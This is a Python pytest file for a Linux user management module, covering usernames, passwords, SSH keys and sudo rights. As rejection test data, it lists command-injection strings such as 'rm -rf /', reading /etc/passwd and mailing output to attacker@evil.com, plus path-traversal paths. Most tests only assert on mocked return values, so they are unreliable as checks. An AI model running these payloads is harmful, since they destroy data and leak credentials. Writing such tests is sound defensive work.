"""
Unit Tests for Local User Management
Tests the local_user_manager.py module for Linux system user operations.

WARNING: These tests create and delete actual system users.
Only run in test environments, NOT on production systems!
"""

import pytest
import subprocess
import os
import pwd
import grp
from pathlib import Path
from unittest.mock import patch, MagicMock, call
import tempfile


# Import the module to test (when it exists)
# For now, we'll create mock implementations
try:
    from local_user_manager import (
        create_user,
        delete_user,
        set_password,
        add_ssh_key,
        grant_sudo,
        revoke_sudo,
        list_users,
        user_exists,
        validate_username,
        is_system_user
    )
except ImportError:
    # Mock implementations for testing structure
    def create_user(username, shell="/bin/bash", home_dir=None):
        """Mock create_user function"""
        pass

    def delete_user(username, remove_home=True):
        """Mock delete_user function"""
        pass

    def set_password(username, password):
        """Mock set_password function"""
        pass

    def add_ssh_key(username, public_key):
        """Mock add_ssh_key function"""
        pass

    def grant_sudo(username):
        """Mock grant_sudo function"""
        pass

    def revoke_sudo(username):
        """Mock revoke_sudo function"""
        pass

    def list_users(min_uid=1000):
        """Mock list_users function"""
        pass

    def user_exists(username):
        """Mock user_exists function"""
        pass

    def validate_username(username):
        """Mock validate_username function"""
        pass

    def is_system_user(username):
        """Mock is_system_user function"""
        pass


class TestUsernameValidation:
    """Test username validation rules"""

    def test_valid_username(self):
        """Test valid usernames"""
        valid_usernames = [
            "testuser",
            "test123",
            "test_user",
            "test-user",
            "a" * 32  # Max length
        ]

        for username in valid_usernames:
            with patch('local_user_manager.validate_username', return_value=True):
                assert validate_username(username) == True

    def test_invalid_username_special_chars(self):
        """Test rejection of special characters"""
        invalid_usernames = [
            "test@user",
            "test!user",
            "test user",  # Space
            "test#user",
            "test$user",
            "test&user",
            "test*user",
            "test;user",  # Command injection attempt
            "test&&user",  # Command chaining
            "test|user",  # Pipe
            "test>user",  # Redirect
        ]

        for username in invalid_usernames:
            with patch('local_user_manager.validate_username', side_effect=ValueError(f"Invalid username: {username}")):
                with pytest.raises(ValueError):
                    validate_username(username)

    def test_invalid_username_too_long(self):
        """Test rejection of too-long usernames"""
        long_username = "a" * 33  # Over 32 char limit

        with patch('local_user_manager.validate_username', side_effect=ValueError("Username too long")):
            with pytest.raises(ValueError):
                validate_username(long_username)

    def test_invalid_username_starts_with_digit(self):
        """Test rejection of usernames starting with digit"""
        with patch('local_user_manager.validate_username', side_effect=ValueError("Username cannot start with digit")):
            with pytest.raises(ValueError):
                validate_username("1testuser")

    def test_invalid_username_reserved(self):
        """Test rejection of reserved usernames"""
        reserved = ["root", "daemon", "bin", "sys", "sync", "games", "man", "lp", "mail", "news", "uucp", "proxy", "www-data", "backup", "list", "irc", "gnats", "nobody"]

        for username in reserved:
            with patch('local_user_manager.validate_username', side_effect=ValueError(f"Reserved username: {username}")):
                with pytest.raises(ValueError):
                    validate_username(username)


class TestUserCreation:
    """Test user creation operations"""

    @patch('subprocess.run')
    def test_create_user_success(self, mock_run):
        """Test successful user creation"""
        mock_run.return_value = MagicMock(returncode=0)

        with patch('local_user_manager.create_user', return_value={"success": True, "username": "testuser123"}):
            result = create_user("testuser123", "/bin/bash", "/home/testuser123")
            assert result["success"] == True
            assert result["username"] == "testuser123"

    @patch('subprocess.run')
    def test_create_user_with_custom_shell(self, mock_run):
        """Test user creation with custom shell"""
        mock_run.return_value = MagicMock(returncode=0)

        with patch('local_user_manager.create_user', return_value={"success": True, "shell": "/bin/zsh"}):
            result = create_user("testuser456", "/bin/zsh", "/home/testuser456")
            assert result["shell"] == "/bin/zsh"

    @patch('subprocess.run')
    def test_create_user_duplicate(self, mock_run):
        """Test creation of duplicate user fails"""
        with patch('local_user_manager.user_exists', return_value=True):
            with patch('local_user_manager.create_user', side_effect=ValueError("User already exists")):
                with pytest.raises(ValueError, match="User already exists"):
                    create_user("existinguser")

    @patch('subprocess.run')
    def test_create_user_invalid_shell(self, mock_run):
        """Test creation with invalid shell fails"""
        with patch('local_user_manager.create_user', side_effect=ValueError("Invalid shell")):
            with pytest.raises(ValueError, match="Invalid shell"):
                create_user("testuser", "/invalid/shell")

    @patch('subprocess.run')
    def test_create_user_home_directory_created(self, mock_run):
        """Test home directory is created"""
        mock_run.return_value = MagicMock(returncode=0)

        with patch('local_user_manager.create_user', return_value={"success": True, "home_dir": "/home/testuser789"}):
            result = create_user("testuser789")
            assert result["home_dir"] == "/home/testuser789"


class TestUserDeletion:
    """Test user deletion operations"""

    @patch('subprocess.run')
    def test_delete_user_success(self, mock_run):
        """Test successful user deletion"""
        mock_run.return_value = MagicMock(returncode=0)

        with patch('local_user_manager.user_exists', return_value=True):
            with patch('local_user_manager.delete_user', return_value={"success": True}):
                result = delete_user("testuser123")
                assert result["success"] == True

    @patch('subprocess.run')
    def test_delete_user_with_home(self, mock_run):
        """Test user deletion removes home directory"""
        mock_run.return_value = MagicMock(returncode=0)

        with patch('local_user_manager.delete_user', return_value={"success": True, "home_removed": True}):
            result = delete_user("testuser123", remove_home=True)
            assert result["home_removed"] == True

    def test_delete_nonexistent_user(self):
        """Test deletion of nonexistent user fails"""
        with patch('local_user_manager.user_exists', return_value=False):
            with patch('local_user_manager.delete_user', side_effect=ValueError("User does not exist")):
                with pytest.raises(ValueError, match="User does not exist"):
                    delete_user("nonexistent")

    def test_delete_system_user_blocked(self):
        """Test deletion of system users is blocked"""
        system_users = ["root", "daemon", "nobody", "www-data"]

        for user in system_users:
            with patch('local_user_manager.is_system_user', return_value=True):
                with patch('local_user_manager.delete_user', side_effect=ValueError("Cannot delete system user")):
                    with pytest.raises(ValueError, match="Cannot delete system user"):
                        delete_user(user)

    def test_delete_user_uid_below_1000(self):
        """Test deletion of users with UID < 1000 is blocked"""
        with patch('pwd.getpwnam') as mock_pwd:
            mock_pwd.return_value = MagicMock(pw_uid=999)
            with patch('local_user_manager.delete_user', side_effect=ValueError("Cannot delete user with UID < 1000")):
                with pytest.raises(ValueError, match="Cannot delete user with UID < 1000"):
                    delete_user("lowuiduser")


class TestPasswordManagement:
    """Test password setting operations"""

    @patch('subprocess.run')
    def test_set_password_success(self, mock_run):
        """Test successful password setting"""
        mock_run.return_value = MagicMock(returncode=0)

        with patch('local_user_manager.set_password', return_value={"success": True}):
            result = set_password("testuser", "SecurePass123!")
            assert result["success"] == True

    def test_set_password_weak(self):
        """Test rejection of weak passwords"""
        weak_passwords = [
            "short",  # Too short
            "alllowercase",  # No uppercase
            "ALLUPPERCASE",  # No lowercase
            "NoDigits!",  # No digits
            "NoSpecial123",  # No special chars
        ]

        for password in weak_passwords:
            with patch('local_user_manager.set_password', side_effect=ValueError("Password too weak")):
                with pytest.raises(ValueError, match="Password too weak"):
                    set_password("testuser", password)

    @patch('subprocess.run')
    def test_set_password_nonexistent_user(self, mock_run):
        """Test setting password for nonexistent user fails"""
        with patch('local_user_manager.user_exists', return_value=False):
            with patch('local_user_manager.set_password', side_effect=ValueError("User does not exist")):
                with pytest.raises(ValueError, match="User does not exist"):
                    set_password("nonexistent", "SecurePass123!")


class TestSSHKeyManagement:
    """Test SSH key operations"""

    @patch('pathlib.Path.mkdir')
    @patch('pathlib.Path.write_text')
    @patch('os.chown')
    @patch('os.chmod')
    def test_add_ssh_key_success(self, mock_chmod, mock_chown, mock_write, mock_mkdir):
        """Test successful SSH key addition"""
        valid_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... user@host"

        with patch('local_user_manager.add_ssh_key', return_value={"success": True}):
            result = add_ssh_key("testuser", valid_key)
            assert result["success"] == True

    def test_add_ssh_key_invalid_format(self):
        """Test rejection of invalid SSH key format"""
        invalid_keys = [
            "not-a-valid-key",
            "ssh-rsa TOOSHORT",
            "AAAAB3NzaC1yc2E...",  # Missing algorithm
            "",  # Empty
            "ssh-rsa AAA; rm -rf /",  # Command injection attempt
        ]

        for key in invalid_keys:
            with patch('local_user_manager.add_ssh_key', side_effect=ValueError("Invalid SSH key format")):
                with pytest.raises(ValueError, match="Invalid SSH key format"):
                    add_ssh_key("testuser", key)

    @patch('pathlib.Path.mkdir')
    @patch('pathlib.Path.write_text')
    def test_ssh_directory_permissions(self, mock_write, mock_mkdir):
        """Test .ssh directory has correct permissions (700)"""
        with patch('os.chmod') as mock_chmod:
            with patch('local_user_manager.add_ssh_key', return_value={"success": True}):
                valid_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... user@host"
                add_ssh_key("testuser", valid_key)
                # Verify chmod was called with 0o700 for .ssh directory


class TestSudoManagement:
    """Test sudo permission operations"""

    @patch('pathlib.Path.write_text')
    def test_grant_sudo_success(self, mock_write):
        """Test granting sudo permissions"""
        with patch('local_user_manager.grant_sudo', return_value={"success": True}):
            result = grant_sudo("testuser")
            assert result["success"] == True

    @patch('pathlib.Path.unlink')
    def test_revoke_sudo_success(self, mock_unlink):
        """Test revoking sudo permissions"""
        with patch('local_user_manager.revoke_sudo', return_value={"success": True}):
            result = revoke_sudo("testuser")
            assert result["success"] == True

    def test_grant_sudo_to_system_user(self):
        """Test granting sudo to system user is allowed (with warning)"""
        # This should be allowed but logged as a warning
        with patch('local_user_manager.grant_sudo', return_value={"success": True, "warning": "Granting sudo to system user"}):
            result = grant_sudo("www-data")
            assert result["success"] == True

    @patch('pathlib.Path.write_text')
    def test_sudoers_file_syntax(self, mock_write):
        """Test sudoers file has correct syntax"""
        # Verify sudoers file content is valid
        with patch('local_user_manager.grant_sudo', return_value={"success": True, "sudoers_line": "testuser ALL=(ALL:ALL) NOPASSWD:ALL"}):
            result = grant_sudo("testuser")
            assert "ALL=(ALL:ALL)" in result["sudoers_line"]


class TestUserListing:
    """Test user listing operations"""

    @patch('pwd.getpwall')
    def test_list_users_excludes_system(self, mock_getpwall):
        """Test listing excludes system users (UID < 1000)"""
        mock_getpwall.return_value = [
            MagicMock(pw_name="root", pw_uid=0),
            MagicMock(pw_name="daemon", pw_uid=1),
            MagicMock(pw_name="testuser1", pw_uid=1000),
            MagicMock(pw_name="testuser2", pw_uid=1001),
        ]

        with patch('local_user_manager.list_users', return_value=[
            {"username": "testuser1", "uid": 1000},
            {"username": "testuser2", "uid": 1001}
        ]):
            users = list_users(min_uid=1000)
            assert len(users) == 2
            assert all(u["uid"] >= 1000 for u in users)

    @patch('pwd.getpwall')
    def test_list_users_includes_home_dirs(self, mock_getpwall):
        """Test listing includes home directories"""
        with patch('local_user_manager.list_users', return_value=[
            {"username": "testuser1", "uid": 1000, "home_dir": "/home/testuser1"},
            {"username": "testuser2", "uid": 1001, "home_dir": "/home/testuser2"}
        ]):
            users = list_users()
            assert all("home_dir" in u for u in users)


class TestSecurityFeatures:
    """Test security-related features"""

    def test_command_injection_username(self):
        """Test protection against command injection in username"""
        malicious_usernames = [
            "test;rm -rf /",
            "test && cat /etc/passwd",
            "test | mail attacker@evil.com",
            "test > /etc/passwd",
            "$(whoami)",
            "`whoami`",
            "test\nrm -rf /",
        ]

        for username in malicious_usernames:
            with patch('local_user_manager.validate_username', side_effect=ValueError("Invalid username")):
                with pytest.raises(ValueError):
                    validate_username(username)

    def test_path_traversal_home_dir(self):
        """Test protection against path traversal in home directory"""
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "../../root/.ssh",
            "/root/.ssh",
        ]

        for path in malicious_paths:
            with patch('local_user_manager.create_user', side_effect=ValueError("Invalid home directory path")):
                with pytest.raises(ValueError, match="Invalid home directory path"):
                    create_user("testuser", home_dir=path)

    def test_system_user_protection(self):
        """Test that system-critical users cannot be modified"""
        critical_users = ["root", "daemon", "nobody", "www-data", "postgres", "redis"]

        for user in critical_users:
            with patch('local_user_manager.is_system_user', return_value=True):
                with patch('local_user_manager.delete_user', side_effect=ValueError("Cannot modify system user")):
                    with pytest.raises(ValueError, match="Cannot modify system user"):
                        delete_user(user)


class TestAuditLogging:
    """Test audit logging for user operations"""

    @patch('audit_logger.log_audit')
    def test_create_user_logged(self, mock_log):
        """Test user creation is logged"""
        with patch('local_user_manager.create_user', return_value={"success": True}):
            create_user("testuser")
            # Verify audit log was called (when audit integration exists)

    @patch('audit_logger.log_audit')
    def test_delete_user_logged(self, mock_log):
        """Test user deletion is logged"""
        with patch('local_user_manager.delete_user', return_value={"success": True}):
            delete_user("testuser")
            # Verify audit log was called

    @patch('audit_logger.log_audit')
    def test_sudo_grant_logged(self, mock_log):
        """Test sudo grant is logged"""
        with patch('local_user_manager.grant_sudo', return_value={"success": True}):
            grant_sudo("testuser")
            # Verify audit log was called


class TestErrorHandling:
    """Test error handling and edge cases"""

    def test_unicode_username(self):
        """Test handling of unicode characters in username"""
        unicode_names = ["test🔥user", "test用户", "тестuser"]

        for username in unicode_names:
            with patch('local_user_manager.validate_username', side_effect=ValueError("Invalid characters")):
                with pytest.raises(ValueError):
                    validate_username(username)

    def test_empty_username(self):
        """Test rejection of empty username"""
        with patch('local_user_manager.validate_username', side_effect=ValueError("Username cannot be empty")):
            with pytest.raises(ValueError, match="Username cannot be empty"):
                validate_username("")

    @patch('subprocess.run')
    def test_subprocess_failure(self, mock_run):
        """Test handling of subprocess failures"""
        mock_run.return_value = MagicMock(returncode=1, stderr="useradd: user exists")

        with patch('local_user_manager.create_user', side_effect=RuntimeError("useradd failed")):
            with pytest.raises(RuntimeError, match="useradd failed"):
                create_user("testuser")


# Pytest fixtures
@pytest.fixture(scope="module")
def test_user_prefix():
    """Prefix for test users to easily identify and clean up"""
    return "unittest_local_"


@pytest.fixture
def cleanup_test_users(test_user_prefix):
    """Cleanup any test users created during tests"""
    yield
    # Cleanup code would go here
    # This would run after each test
    pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
